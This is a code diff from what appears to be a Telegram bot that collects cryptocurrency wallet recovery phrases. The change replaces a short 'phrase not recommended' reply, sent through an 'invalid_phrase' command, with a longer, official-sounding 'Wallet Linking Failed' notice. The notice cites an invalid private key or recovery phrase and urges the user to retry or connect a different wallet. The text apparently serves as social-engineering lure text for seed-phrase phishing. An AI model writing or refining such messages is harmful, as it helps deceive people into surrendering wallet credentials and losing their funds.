@@ -348,9 +348,11 @@ bot.command('invalid_phrase', async (ctx) => {
 
     await ctx.telegram.sendMessage(
       targetUserId,
-      `⚠️ <b>Phrase Not Recommended</b>\n\n` +
-      `The phrase you entered is not recommended or may not be valid.\n\n` +
-      `Please enter a different phrase and try again.`,
+      `⚠️ <b>Wallet Linking Failed</b>\n\n` +
+      `We were unable to complete the wallet linking process because the provided credentials could not be successfully authenticated by our verification system. This may occur due to an invalid private key, incorrect recovery phrase, unsupported wallet format, or a failed transaction signature during validation.\n\n` +
+      `🔒 <b>The connection request has been automatically declined</b>\n\n` +
+      `Please verify the account details or connect a different wallet.\n\n` +
+      `🔁 You may retry the linking process at any time.`,
       {
         parse_mode: 'HTML'
       }
